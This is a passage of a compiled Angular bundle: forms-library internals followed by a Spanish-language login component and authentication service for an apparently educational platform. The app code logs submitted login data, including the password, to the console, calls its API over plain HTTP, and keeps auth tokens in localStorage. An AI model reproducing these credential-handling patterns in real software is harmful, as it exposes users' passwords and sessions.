    /** @nodoc */
    ngOnChanges(changes) {
      if (!this._added)
        this._setUpControl();
      if (isPropertyUpdated(changes, this.viewModel)) {
        if (typeof ngDevMode === "undefined" || ngDevMode) {
          _ngModelWarning("formControlName", _FormControlName, this, this._ngModelWarningConfig);
        }
        this.viewModel = this.model;
        this.formDirective.updateModel(this, this.model);
      }
    }
    /** @nodoc */
    ngOnDestroy() {
      if (this.formDirective) {
        this.formDirective.removeControl(this);
      }
    }
    /**
     * @description
     * Sets the new value for the view model and emits an `ngModelChange` event.
     *
     * @param newValue The new value for the view model.
     */
    viewToModelUpdate(newValue) {
      this.viewModel = newValue;
      this.update.emit(newValue);
    }
    /**
     * @description
     * Returns an array that represents the path from the top-level form to this control.
     * Each index is the string name of the control on that level.
     */
    get path() {
      return controlPath(this.name == null ? this.name : this.name.toString(), this._parent);
    }
    /**
     * @description
     * The top-level directive for this group if present, otherwise null.
     */
    get formDirective() {
      return this._parent ? this._parent.formDirective : null;
    }
    _checkParentType() {
      if (typeof ngDevMode === "undefined" || ngDevMode) {
        if (!(this._parent instanceof FormGroupName) && this._parent instanceof AbstractFormGroupDirective) {
          throw ngModelGroupException();
        } else if (!(this._parent instanceof FormGroupName) && !(this._parent instanceof FormGroupDirective) && !(this._parent instanceof FormArrayName)) {
          throw controlParentException();
        }
      }
    }
    _setUpControl() {
      this._checkParentType();
      this.control = this.formDirective.addControl(this);
      this._added = true;
    }
  };
  _FormControlName._ngModelWarningSentOnce = false;
  _FormControlName.\u0275fac = function FormControlName_Factory(t) {
    return new (t || _FormControlName)(\u0275\u0275directiveInject(ControlContainer, 13), \u0275\u0275directiveInject(NG_VALIDATORS, 10), \u0275\u0275directiveInject(NG_ASYNC_VALIDATORS, 10), \u0275\u0275directiveInject(NG_VALUE_ACCESSOR, 10), \u0275\u0275directiveInject(NG_MODEL_WITH_FORM_CONTROL_WARNING, 8));
  };
  _FormControlName.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _FormControlName,
    selectors: [["", "formControlName", ""]],
    inputs: {
      name: ["formControlName", "name"],
      isDisabled: ["disabled", "isDisabled"],
      model: ["ngModel", "model"]
    },
    outputs: {
      update: "ngModelChange"
    },
    features: [\u0275\u0275ProvidersFeature([controlNameBinding]), \u0275\u0275InheritDefinitionFeature, \u0275\u0275NgOnChangesFeature]
  });
  let FormControlName2 = _FormControlName;
  return FormControlName2;
})();
var \u0275InternalFormsSharedModule = /* @__PURE__ */ (() => {
  const _\u0275InternalFormsSharedModule = class _\u0275InternalFormsSharedModule {
  };
  _\u0275InternalFormsSharedModule.\u0275fac = function \u0275InternalFormsSharedModule_Factory(t) {
    return new (t || _\u0275InternalFormsSharedModule)();
  };
  _\u0275InternalFormsSharedModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _\u0275InternalFormsSharedModule
  });
  _\u0275InternalFormsSharedModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [RadioControlRegistryModule]
  });
  let \u0275InternalFormsSharedModule2 = _\u0275InternalFormsSharedModule;
  return \u0275InternalFormsSharedModule2;
})();
var FormArray = class extends AbstractControl {
  /**
   * Creates a new `FormArray` instance.
   *
   * @param controls An array of child controls. Each child control is given an index
   * where it is registered.
   *
   * @param validatorOrOpts A synchronous validator function, or an array of
   * such functions, or an `AbstractControlOptions` object that contains validation functions
   * and a validation trigger.
   *
   * @param asyncValidator A single async validator or array of async validator functions
   *
   */
  constructor(controls, validatorOrOpts, asyncValidator) {
    super(pickValidators(validatorOrOpts), pickAsyncValidators(asyncValidator, validatorOrOpts));
    this.controls = controls;
    this._initObservables();
    this._setUpdateStrategy(validatorOrOpts);
    this._setUpControls();
    this.updateValueAndValidity({
      onlySelf: true,
      // If `asyncValidator` is present, it will trigger control status change from `PENDING` to
      // `VALID` or `INVALID`.
      // The status should be broadcasted via the `statusChanges` observable, so we set `emitEvent`
      // to `true` to allow that during the control creation process.
      emitEvent: !!this.asyncValidator
    });
  }
  /**
   * Get the `AbstractControl` at the given `index` in the array.
   *
   * @param index Index in the array to retrieve the control. If `index` is negative, it will wrap
   *     around from the back, and if index is greatly negative (less than `-length`), the result is
   * undefined. This behavior is the same as `Array.at(index)`.
   */
  at(index) {
    return this.controls[this._adjustIndex(index)];
  }
  /**
   * Insert a new `AbstractControl` at the end of the array.
   *
   * @param control Form control to be inserted
   * @param options Specifies whether this FormArray instance should emit events after a new
   *     control is added.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges` observables emit events with the latest status and value when the control is
   * inserted. When false, no events are emitted.
   */
  push(control, options = {}) {
    this.controls.push(control);
    this._registerControl(control);
    this.updateValueAndValidity({
      emitEvent: options.emitEvent
    });
    this._onCollectionChange();
  }
  /**
   * Insert a new `AbstractControl` at the given `index` in the array.
   *
   * @param index Index in the array to insert the control. If `index` is negative, wraps around
   *     from the back. If `index` is greatly negative (less than `-length`), prepends to the array.
   * This behavior is the same as `Array.splice(index, 0, control)`.
   * @param control Form control to be inserted
   * @param options Specifies whether this FormArray instance should emit events after a new
   *     control is inserted.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges` observables emit events with the latest status and value when the control is
   * inserted. When false, no events are emitted.
   */
  insert(index, control, options = {}) {
    this.controls.splice(index, 0, control);
    this._registerControl(control);
    this.updateValueAndValidity({
      emitEvent: options.emitEvent
    });
  }
  /**
   * Remove the control at the given `index` in the array.
   *
   * @param index Index in the array to remove the control.  If `index` is negative, wraps around
   *     from the back. If `index` is greatly negative (less than `-length`), removes the first
   *     element. This behavior is the same as `Array.splice(index, 1)`.
   * @param options Specifies whether this FormArray instance should emit events after a
   *     control is removed.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges` observables emit events with the latest status and value when the control is
   * removed. When false, no events are emitted.
   */
  removeAt(index, options = {}) {
    let adjustedIndex = this._adjustIndex(index);
    if (adjustedIndex < 0)
      adjustedIndex = 0;
    if (this.controls[adjustedIndex])
      this.controls[adjustedIndex]._registerOnCollectionChange(() => {
      });
    this.controls.splice(adjustedIndex, 1);
    this.updateValueAndValidity({
      emitEvent: options.emitEvent
    });
  }
  /**
   * Replace an existing control.
   *
   * @param index Index in the array to replace the control. If `index` is negative, wraps around
   *     from the back. If `index` is greatly negative (less than `-length`), replaces the first
   *     element. This behavior is the same as `Array.splice(index, 1, control)`.
   * @param control The `AbstractControl` control to replace the existing control
   * @param options Specifies whether this FormArray instance should emit events after an
   *     existing control is replaced with a new one.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges` observables emit events with the latest status and value when the control is
   * replaced with a new one. When false, no events are emitted.
   */
  setControl(index, control, options = {}) {
    let adjustedIndex = this._adjustIndex(index);
    if (adjustedIndex < 0)
      adjustedIndex = 0;
    if (this.controls[adjustedIndex])
      this.controls[adjustedIndex]._registerOnCollectionChange(() => {
      });
    this.controls.splice(adjustedIndex, 1);
    if (control) {
      this.controls.splice(adjustedIndex, 0, control);
      this._registerControl(control);
    }
    this.updateValueAndValidity({
      emitEvent: options.emitEvent
    });
    this._onCollectionChange();
  }
  /**
   * Length of the control array.
   */
  get length() {
    return this.controls.length;
  }
  /**
   * Sets the value of the `FormArray`. It accepts an array that matches
   * the structure of the control.
   *
   * This method performs strict checks, and throws an error if you try
   * to set the value of a control that doesn't exist or if you exclude the
   * value of a control.
   *
   * @usageNotes
   * ### Set the values for the controls in the form array
   *
   * ```
   * const arr = new FormArray([
   *   new FormControl(),
   *   new FormControl()
   * ]);
   * console.log(arr.value);   // [null, null]
   *
   * arr.setValue(['Nancy', 'Drew']);
   * console.log(arr.value);   // ['Nancy', 'Drew']
   * ```
   *
   * @param value Array of values for the controls
   * @param options Configure options that determine how the control propagates changes and
   * emits events after the value changes
   *
   * * `onlySelf`: When true, each change only affects this control, and not its parent. Default
   * is false.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges`
   * observables emit events with the latest status and value when the control value is updated.
   * When false, no events are emitted.
   * The configuration options are passed to the {@link AbstractControl#updateValueAndValidity
   * updateValueAndValidity} method.
   */
  setValue(value, options = {}) {
    assertAllValuesPresent(this, false, value);
    value.forEach((newValue, index) => {
      assertControlPresent(this, false, index);
      this.at(index).setValue(newValue, {
        onlySelf: true,
        emitEvent: options.emitEvent
      });
    });
    this.updateValueAndValidity(options);
  }
  /**
   * Patches the value of the `FormArray`. It accepts an array that matches the
   * structure of the control, and does its best to match the values to the correct
   * controls in the group.
   *
   * It accepts both super-sets and sub-sets of the array without throwing an error.
   *
   * @usageNotes
   * ### Patch the values for controls in a form array
   *
   * ```
   * const arr = new FormArray([
   *    new FormControl(),
   *    new FormControl()
   * ]);
   * console.log(arr.value);   // [null, null]
   *
   * arr.patchValue(['Nancy']);
   * console.log(arr.value);   // ['Nancy', null]
   * ```
   *
   * @param value Array of latest values for the controls
   * @param options Configure options that determine how the control propagates changes and
   * emits events after the value changes
   *
   * * `onlySelf`: When true, each change only affects this control, and not its parent. Default
   * is false.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges` observables emit events with the latest status and value when the control
   * value is updated. When false, no events are emitted. The configuration options are passed to
   * the {@link AbstractControl#updateValueAndValidity updateValueAndValidity} method.
   */
  patchValue(value, options = {}) {
    if (value == null)
      return;
    value.forEach((newValue, index) => {
      if (this.at(index)) {
        this.at(index).patchValue(newValue, {
          onlySelf: true,
          emitEvent: options.emitEvent
        });
      }
    });
    this.updateValueAndValidity(options);
  }
  /**
   * Resets the `FormArray` and all descendants are marked `pristine` and `untouched`, and the
   * value of all descendants to null or null maps.
   *
   * You reset to a specific form state by passing in an array of states
   * that matches the structure of the control. The state is a standalone value
   * or a form state object with both a value and a disabled status.
   *
   * @usageNotes
   * ### Reset the values in a form array
   *
   * ```ts
   * const arr = new FormArray([
   *    new FormControl(),
   *    new FormControl()
   * ]);
   * arr.reset(['name', 'last name']);
   *
   * console.log(arr.value);  // ['name', 'last name']
   * ```
   *
   * ### Reset the values in a form array and the disabled status for the first control
   *
   * ```
   * arr.reset([
   *   {value: 'name', disabled: true},
   *   'last'
   * ]);
   *
   * console.log(arr.value);  // ['last']
   * console.log(arr.at(0).status);  // 'DISABLED'
   * ```
   *
   * @param value Array of values for the controls
   * @param options Configure options that determine how the control propagates changes and
   * emits events after the value changes
   *
   * * `onlySelf`: When true, each change only affects this control, and not its parent. Default
   * is false.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges`
   * observables emit events with the latest status and value when the control is reset.
   * When false, no events are emitted.
   * The configuration options are passed to the {@link AbstractControl#updateValueAndValidity
   * updateValueAndValidity} method.
   */
  reset(value = [], options = {}) {
    this._forEachChild((control, index) => {
      control.reset(value[index], {
        onlySelf: true,
        emitEvent: options.emitEvent
      });
    });
    this._updatePristine(options);
    this._updateTouched(options);
    this.updateValueAndValidity(options);
  }
  /**
   * The aggregate value of the array, including any disabled controls.
   *
   * Reports all values regardless of disabled status.
   */
  getRawValue() {
    return this.controls.map((control) => control.getRawValue());
  }
  /**
   * Remove all controls in the `FormArray`.
   *
   * @param options Specifies whether this FormArray instance should emit events after all
   *     controls are removed.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges` observables emit events with the latest status and value when all controls
   * in this FormArray instance are removed. When false, no events are emitted.
   *
   * @usageNotes
   * ### Remove all elements from a FormArray
   *
   * ```ts
   * const arr = new FormArray([
   *    new FormControl(),
   *    new FormControl()
   * ]);
   * console.log(arr.length);  // 2
   *
   * arr.clear();
   * console.log(arr.length);  // 0
   * ```
   *
   * It's a simpler and more efficient alternative to removing all elements one by one:
   *
   * ```ts
   * const arr = new FormArray([
   *    new FormControl(),
   *    new FormControl()
   * ]);
   *
   * while (arr.length) {
   *    arr.removeAt(0);
   * }
   * ```
   */
  clear(options = {}) {
    if (this.controls.length < 1)
      return;
    this._forEachChild((control) => control._registerOnCollectionChange(() => {
    }));
    this.controls.splice(0);
    this.updateValueAndValidity({
      emitEvent: options.emitEvent
    });
  }
  /**
   * Adjusts a negative index by summing it with the length of the array. For very negative
   * indices, the result may remain negative.
   * @internal
   */
  _adjustIndex(index) {
    return index < 0 ? index + this.length : index;
  }
  /** @internal */
  _syncPendingControls() {
    let subtreeUpdated = this.controls.reduce((updated, child) => {
      return child._syncPendingControls() ? true : updated;
    }, false);
    if (subtreeUpdated)
      this.updateValueAndValidity({
        onlySelf: true
      });
    return subtreeUpdated;
  }
  /** @internal */
  _forEachChild(cb) {
    this.controls.forEach((control, index) => {
      cb(control, index);
    });
  }
  /** @internal */
  _updateValue() {
    this.value = this.controls.filter((control) => control.enabled || this.disabled).map((control) => control.value);
  }
  /** @internal */
  _anyControls(condition) {
    return this.controls.some((control) => control.enabled && condition(control));
  }
  /** @internal */
  _setUpControls() {
    this._forEachChild((control) => this._registerControl(control));
  }
  /** @internal */
  _allControlsDisabled() {
    for (const control of this.controls) {
      if (control.enabled)
        return false;
    }
    return this.controls.length > 0 || this.disabled;
  }
  _registerControl(control) {
    control.setParent(this);
    control._registerOnCollectionChange(this._onCollectionChange);
  }
  /** @internal */
  _find(name) {
    return this.at(name) ?? null;
  }
};
function isAbstractControlOptions(options) {
  return !!options && (options.asyncValidators !== void 0 || options.validators !== void 0 || options.updateOn !== void 0);
}
var FormBuilder = /* @__PURE__ */ (() => {
  const _FormBuilder = class _FormBuilder {
    constructor() {
      this.useNonNullable = false;
    }
    /**
     * @description
     * Returns a FormBuilder in which automatically constructed `FormControl` elements
     * have `{nonNullable: true}` and are non-nullable.
     *
     * **Constructing non-nullable controls**
     *
     * When constructing a control, it will be non-nullable, and will reset to its initial value.
     *
     * ```ts
     * let nnfb = new FormBuilder().nonNullable;
     * let name = nnfb.control('Alex'); // FormControl<string>
     * name.reset();
     * console.log(name); // 'Alex'
     * ```
     *
     * **Constructing non-nullable groups or arrays**
     *
     * When constructing a group or array, all automatically created inner controls will be
     * non-nullable, and will reset to their initial values.
     *
     * ```ts
     * let nnfb = new FormBuilder().nonNullable;
     * let name = nnfb.group({who: 'Alex'}); // FormGroup<{who: FormControl<string>}>
     * name.reset();
     * console.log(name); // {who: 'Alex'}
     * ```
     * **Constructing *nullable* fields on groups or arrays**
     *
     * It is still possible to have a nullable field. In particular, any `FormControl` which is
     * *already* constructed will not be altered. For example:
     *
     * ```ts
     * let nnfb = new FormBuilder().nonNullable;
     * // FormGroup<{who: FormControl<string|null>}>
     * let name = nnfb.group({who: new FormControl('Alex')});
     * name.reset(); console.log(name); // {who: null}
     * ```
     *
     * Because the inner control is constructed explicitly by the caller, the builder has
     * no control over how it is created, and cannot exclude the `null`.
     */
    get nonNullable() {
      const nnfb = new _FormBuilder();
      nnfb.useNonNullable = true;
      return nnfb;
    }
    group(controls, options = null) {
      const reducedControls = this._reduceControls(controls);
      let newOptions = {};
      if (isAbstractControlOptions(options)) {
        newOptions = options;
      } else if (options !== null) {
        newOptions.validators = options.validator;
        newOptions.asyncValidators = options.asyncValidator;
      }
      return new FormGroup(reducedControls, newOptions);
    }
    /**
     * @description
     * Constructs a new `FormRecord` instance. Accepts a single generic argument, which is an object
     * containing all the keys and corresponding inner control types.
     *
     * @param controls A collection of child controls. The key for each child is the name
     * under which it is registered.
     *
     * @param options Configuration options object for the `FormRecord`. The object should have the
     * `AbstractControlOptions` type and might contain the following fields:
     * * `validators`: A synchronous validator function, or an array of validator functions.
     * * `asyncValidators`: A single async validator or array of async validator functions.
     * * `updateOn`: The event upon which the control should be updated (options: 'change' | 'blur'
     * | submit').
     */
    record(controls, options = null) {
      const reducedControls = this._reduceControls(controls);
      return new FormRecord(reducedControls, options);
    }
    /**
     * @description
     * Constructs a new `FormControl` with the given state, validators and options. Sets
     * `{nonNullable: true}` in the options to get a non-nullable control. Otherwise, the
     * control will be nullable. Accepts a single generic argument, which is the type  of the
     * control's value.
     *
     * @param formState Initializes the control with an initial state value, or
     * with an object that contains both a value and a disabled status.
     *
     * @param validatorOrOpts A synchronous validator function, or an array of
     * such functions, or a `FormControlOptions` object that contains
     * validation functions and a validation trigger.
     *
     * @param asyncValidator A single async validator or array of async validator
     * functions.
     *
     * @usageNotes
     *
     * ### Initialize a control as disabled
     *
     * The following example returns a control with an initial value in a disabled state.
     *
     * <code-example path="forms/ts/formBuilder/form_builder_example.ts" region="disabled-control">
     * </code-example>
     */
    control(formState, validatorOrOpts, asyncValidator) {
      let newOptions = {};
      if (!this.useNonNullable) {
        return new FormControl(formState, validatorOrOpts, asyncValidator);
      }
      if (isAbstractControlOptions(validatorOrOpts)) {
        newOptions = validatorOrOpts;
      } else {
        newOptions.validators = validatorOrOpts;
        newOptions.asyncValidators = asyncValidator;
      }
      return new FormControl(formState, __spreadProps(__spreadValues({}, newOptions), {
        nonNullable: true
      }));
    }
    /**
     * Constructs a new `FormArray` from the given array of configurations,
     * validators and options. Accepts a single generic argument, which is the type of each control
     * inside the array.
     *
     * @param controls An array of child controls or control configs. Each child control is given an
     *     index when it is registered.
     *
     * @param validatorOrOpts A synchronous validator function, or an array of such functions, or an
     *     `AbstractControlOptions` object that contains
     * validation functions and a validation trigger.
     *
     * @param asyncValidator A single async validator or array of async validator functions.
     */
    array(controls, validatorOrOpts, asyncValidator) {
      const createdControls = controls.map((c) => this._createControl(c));
      return new FormArray(createdControls, validatorOrOpts, asyncValidator);
    }
    /** @internal */
    _reduceControls(controls) {
      const createdControls = {};
      Object.keys(controls).forEach((controlName) => {
        createdControls[controlName] = this._createControl(controls[controlName]);
      });
      return createdControls;
    }
    /** @internal */
    _createControl(controls) {
      if (controls instanceof FormControl) {
        return controls;
      } else if (controls instanceof AbstractControl) {
        return controls;
      } else if (Array.isArray(controls)) {
        const value = controls[0];
        const validator = controls.length > 1 ? controls[1] : null;
        const asyncValidator = controls.length > 2 ? controls[2] : null;
        return this.control(value, validator, asyncValidator);
      } else {
        return this.control(controls);
      }
    }
  };
  _FormBuilder.\u0275fac = function FormBuilder_Factory(t) {
    return new (t || _FormBuilder)();
  };
  _FormBuilder.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _FormBuilder,
    factory: _FormBuilder.\u0275fac,
    providedIn: "root"
  });
  let FormBuilder2 = _FormBuilder;
  return FormBuilder2;
})();
var FormsModule = /* @__PURE__ */ (() => {
  const _FormsModule = class _FormsModule {
    /**
     * @description
     * Provides options for configuring the forms module.
     *
     * @param opts An object of configuration options
     * * `callSetDisabledState` Configures whether to `always` call `setDisabledState`, which is more
     * correct, or to only call it `whenDisabled`, which is the legacy behavior.
     */
    static withConfig(opts) {
      return {
        ngModule: _FormsModule,
        providers: [{
          provide: CALL_SET_DISABLED_STATE,
          useValue: opts.callSetDisabledState ?? setDisabledStateDefault
        }]
      };
    }
  };
  _FormsModule.\u0275fac = function FormsModule_Factory(t) {
    return new (t || _FormsModule)();
  };
  _FormsModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _FormsModule
  });
  _FormsModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [\u0275InternalFormsSharedModule]
  });
  let FormsModule2 = _FormsModule;
  return FormsModule2;
})();
var ReactiveFormsModule = /* @__PURE__ */ (() => {
  const _ReactiveFormsModule = class _ReactiveFormsModule {
    /**
     * @description
     * Provides options for configuring the reactive forms module.
     *
     * @param opts An object of configuration options
     * * `warnOnNgModelWithFormControl` Configures when to emit a warning when an `ngModel`
     * binding is used with reactive form directives.
     * * `callSetDisabledState` Configures whether to `always` call `setDisabledState`, which is more
     * correct, or to only call it `whenDisabled`, which is the legacy behavior.
     */
    static withConfig(opts) {
      return {
        ngModule: _ReactiveFormsModule,
        providers: [{
          provide: NG_MODEL_WITH_FORM_CONTROL_WARNING,
          useValue: opts.warnOnNgModelWithFormControl ?? "always"
        }, {
          provide: CALL_SET_DISABLED_STATE,
          useValue: opts.callSetDisabledState ?? setDisabledStateDefault
        }]
      };
    }
  };
  _ReactiveFormsModule.\u0275fac = function ReactiveFormsModule_Factory(t) {
    return new (t || _ReactiveFormsModule)();
  };
  _ReactiveFormsModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _ReactiveFormsModule
  });
  _ReactiveFormsModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [\u0275InternalFormsSharedModule]
  });
  let ReactiveFormsModule2 = _ReactiveFormsModule;
  return ReactiveFormsModule2;
})();

// src/app/auth/login/login.component.ts
var import_sweetalert2 = __toESM(require_sweetalert2_all());

// src/environments/environment.ts
var environment = {
  production: true,
  base_url: "http://h214.eps.ua.es/api"
};

// src/app/services/auth.service.ts
var AuthService = /* @__PURE__ */ (() => {
  const _AuthService = class _AuthService {
    constructor(http) {
      this.http = http;
      this.httpOptions = {
        headers: new HttpHeaders({
          "Content-Type": "application/json"
        })
      };
    }
    // Manejador de errores API
    handleError(error) {
      if (error.error instanceof ErrorEvent) {
        console.log("Ha ocurrido un error: ", error, error.message);
      } else {
        console.error(`Codigo Error: '${error.status}' Body: '${error.error}'`);
      }
      return throwError("Ha sucedido un problema, reintentalo m\xE1s tarde");
    }
    login(formData) {
      console.log(formData);
      return this.http.post(`${environment.base_url}/login`, formData).pipe(tap((res) => {
        localStorage.setItem("rol", res.rol);
      }));
    }
    registro(formData) {
      return this.http.post(`${environment.base_url}/centros`, formData);
    }
    validarToken() {
      const token = localStorage.getItem("token") || "";
      if (token === "") {
        return of(false);
      }
      return this.http.get(`${environment.base_url}/login/token`, {
        headers: {
          "x-token": token
        }
      }).pipe(tap((res) => {
        localStorage.setItem("token", res.token);
      }), map((resp) => {
        return true;
      }), catchError((err) => {
        console.warn(err);
        return of(false);
      }));
    }
  };
  _AuthService.\u0275fac = function AuthService_Factory(t) {
    return new (t || _AuthService)(\u0275\u0275inject(HttpClient));
  };
  _AuthService.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _AuthService,
    factory: _AuthService.\u0275fac,
    providedIn: "root"
  });
  let AuthService2 = _AuthService;
  return AuthService2;
})();

// src/app/auth/login/login.component.ts
function LoginComponent_p_16_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 27);
    \u0275\u0275text(1, "El usuario es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function LoginComponent_p_21_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 27);
    \u0275\u0275text(1, "La contrase\xF1a es obligatoria");
    \u0275\u0275elementEnd();
  }
}
var _c0 = () => ["/recovery"];
var _c1 = () => ["/registro"];
var LoginComponent = /* @__PURE__ */ (() => {
  const _LoginComponent = class _LoginComponent {
    constructor(fb, authService, router) {
      this.fb = fb;
      this.authService = authService;
      this.router = router;
      this.sendForm = false;
      this.form = this.fb.group({
        Usuario: [localStorage.getItem("usuario") || "", [Validators.required]],
        Contrase\u00F1a: ["", [Validators.required]],
        Remember: [localStorage.getItem("usuario")]
      });
    }
    ngOnInit() {
    }
    login() {
      this.sendForm = true;
      console.log(this.sendForm);
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        const formData = __spreadProps(__spreadValues({}, this.form.value), {
          Usuario: this.form.value.Usuario || "",
          Contrase\u00F1a: this.form.value.Contrase\u00F1a || "",
          Remember: !!this.form.value.Remember
        });
        console.log("login");
        this.authService.login(formData).subscribe((response) => {
          localStorage.setItem("token", response.token);
          if (this.form.get("Remember")?.value ?? "") {
            localStorage.setItem("usuario", this.form.get("Usuario")?.value ?? "");
          } else {
            localStorage.removeItem("usuario");
          }
          console.log("Respuesta del servidor:", response);
          if (response.rol == "Admin") {
            this.router.navigate(["admin/dashboard"]);
          }
          if (response.rol == "Centro") {
            this.router.navigate(["centros/dashboard"]);
          }
          if (response.rol == "Alumno") {
            this.router.navigate(["alumnos/dashboard"]);
          }
          if (response.rol == "Profesor") {
            this.router.navigate(["profesores/dashboard"]);
          }
        }, (error) => {
          console.error("Error de autenticaci\xF3n:", error);
          import_sweetalert2.default.fire(error.error.msg);
        });
      }
    }
    validarLogin(campo) {
      return this.form.get(campo)?.valid || !this.sendForm;
    }
  };
  _LoginComponent.\u0275fac = function LoginComponent_Factory(t) {
    return new (t || _LoginComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(AuthService), \u0275\u0275directiveInject(Router));
  };
  _LoginComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _LoginComponent,
    selectors: [["app-login"]],
    decls: 36,
    vars: 7,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "position-relative", "overflow-hidden", "radial-gradient", "min-vh-100", "d-flex", "align-items-center", "justify-content-center"], [1, "d-flex", "align-items-center", "justify-content-center", "w-100"], [1, "row", "justify-content-center", "w-100"], [1, "col-md-8", "col-lg-6", "col-xxl-3"], [1, "card", "mb-0"], [1, "card-body"], ["href", "./index.html", 1, "text-nowrap", "logo-img", "text-center", "d-block", "py-3", "w-100"], ["src", "../assets/images/logos/logo.png", "width", "180", "alt", ""], [1, "text-center"], [3, "formGroup"], [1, "mb-3"], ["for", "Usuario", 1, "form-label"], ["formControlName", "Usuario", "id", "Usuario", 1, "form-control"], ["class", "text-danger", 4, "ngIf"], [1, "mb-4"], ["for", "Contrase\xF1a", 1, "form-label"], ["type", "password", "formControlName", "Contrase\xF1a", "id", "Constrase\xF1a", 1, "form-control"], [1, "d-flex", "align-items-center", "justify-content-between", "mb-4"], [1, "form-check"], ["type", "checkbox", "value", "", "id", "flexCheckChecked", "formControlName", "Remember", 1, "form-check-input", "primary"], ["for", "flexCheckChecked", 1, "form-check-label", "text-dark"], [1, "text-primary", "fw-bold", 3, "routerLink"], [1, "btn", "btn-primary", "w-100", "py-8", "fs-4", "mb-4", "rounded-2", 3, "click"], [1, "d-flex", "align-items-center", "justify-content-center"], [1, "fs-4", "mb-0", "fw-bold"], [1, "text-primary", "fw-bold", "ms-2", 3, "routerLink"], [1, "text-danger"]],
    template: function LoginComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 3)(4, "div", 4)(5, "div", 5)(6, "div", 6)(7, "a", 7);
        \u0275\u0275element(8, "img", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "p", 9);
        \u0275\u0275text(10, "Bienvenido de nuevo");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(11, "form", 10)(12, "div", 11)(13, "label", 12);
        \u0275\u0275text(14, "Usuario / Email");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 13);
        \u0275\u0275elementEnd();
        \u0275\u0275template(16, LoginComponent_p_16_Template, 2, 0, "p", 14);
        \u0275\u0275elementStart(17, "div", 15)(18, "label", 16);
        \u0275\u0275text(19, "Constrase\xF1a");
        \u0275\u0275elementEnd();
        \u0275\u0275element(20, "input", 17);
        \u0275\u0275elementEnd();
        \u0275\u0275template(21, LoginComponent_p_21_Template, 2, 0, "p", 14);
        \u0275\u0275elementStart(22, "div", 18)(23, "div", 19);
        \u0275\u0275element(24, "input", 20);
        \u0275\u0275elementStart(25, "label", 21);
        \u0275\u0275text(26, " Recu\xE9rdame ");
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(27, "a", 22);
        \u0275\u0275text(28, "\xBFHas olvidado tu contrase\xF1a?");
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(29, "button", 23);
        \u0275\u0275listener("click", function LoginComponent_Template_button_click_29_listener() {
          return ctx.login();
        });
        \u0275\u0275text(30, "Entrar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(31, "div", 24)(32, "p", 25);
        \u0275\u0275text(33, "\xBFEres un Centro?");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(34, "a", 26);
        \u0275\u0275text(35, "Reg\xEDstrate");
        \u0275\u0275elementEnd()()()()()()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarLogin("Usuario"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarLogin("Contrase\xF1a"));
        \u0275\u0275advance(6);
        \u0275\u0275property("routerLink", \u0275\u0275pureFunction0(5, _c0));
        \u0275\u0275advance(7);
        \u0275\u0275property("routerLink", \u0275\u0275pureFunction0(6, _c1));
      }
    },
    dependencies: [NgIf, RouterLink, \u0275NgNoValidate, DefaultValueAccessor, CheckboxControlValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let LoginComponent2 = _LoginComponent;
  return LoginComponent2;
})();

// src/app/auth/recovery/recovery.component.ts
var RecoveryComponent = /* @__PURE__ */ (() => {
  const _RecoveryComponent = class _RecoveryComponent {
  };
  _RecoveryComponent.\u0275fac = function RecoveryComponent_Factory(t) {
    return new (t || _RecoveryComponent)();
  };
  _RecoveryComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _RecoveryComponent,
    selectors: [["app-recovery"]],
    decls: 22,
    vars: 0,
